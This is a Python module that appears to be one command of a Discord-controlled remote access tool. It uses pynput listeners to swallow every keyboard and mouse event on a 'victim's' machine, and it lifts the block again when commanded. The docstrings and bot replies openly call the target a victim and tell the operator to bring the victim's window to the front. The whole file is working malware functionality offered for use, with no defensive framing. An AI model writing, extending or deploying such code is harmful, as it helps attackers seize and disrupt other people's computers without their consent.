"""Block or release the keyboard and the mouse on this machine.

The blocking is done with pynput listeners that swallow every event, so
the victim keeps typing and clicking without anything happening. The
listeners only see the events of the focused window, so the window of the
victim has to be in front for the blocking to be noticeable.
"""

import asyncio
from typing import Any

from discord.ext import commands
from discord.ext.commands import Context

# The listeners that swallow the keyboard and the mouse events.
keyboard_listener: Any = None
mouse_listener: Any = None


def stop_listeners() -> None:
    """Stop the listeners that block the input."""
    global keyboard_listener, mouse_listener

    for listener in (keyboard_listener, mouse_listener):
        if listener is None:
            continue

        try:
            listener.stop()
        except Exception as exc:
            print(f"[-] Could not stop a listener: {exc}")

    keyboard_listener = None
    mouse_listener = None


async def block_input(ctx: Context[commands.Bot]) -> None:
    """Swallow the keyboard and the mouse events on this machine."""
    global keyboard_listener, mouse_listener

    if keyboard_listener is not None or mouse_listener is not None:
        await ctx.reply("The input is already blocked.")
        return

    # Imported here so the Discord bot can use this module without
    # pulling in the input hooks.
    from pynput import keyboard, mouse

    try:
        keyboard_listener = keyboard.Listener(suppress=True)
        mouse_listener = mouse.Listener(suppress=True)
        keyboard_listener.start()
        mouse_listener.start()
    except Exception as exc:
        print(f"[-] Could not block the input: {exc}")
        stop_listeners()
        await ctx.reply("Could not block the input.")
        return

    await ctx.reply(
        "Input blocked. The listeners only see the events of the focused "
        "window, so bring the window of the victim to the front."
    )


async def unblock_input(ctx: Context[commands.Bot]) -> None:
    """Let the keyboard and the mouse events through again."""
    if keyboard_listener is None and mouse_listener is None:
        await ctx.reply("The input is not blocked.")
        return

    # Stopping the listeners joins their threads, which blocks.
    await asyncio.to_thread(stop_listeners)

    await ctx.reply("Input unblocked.")
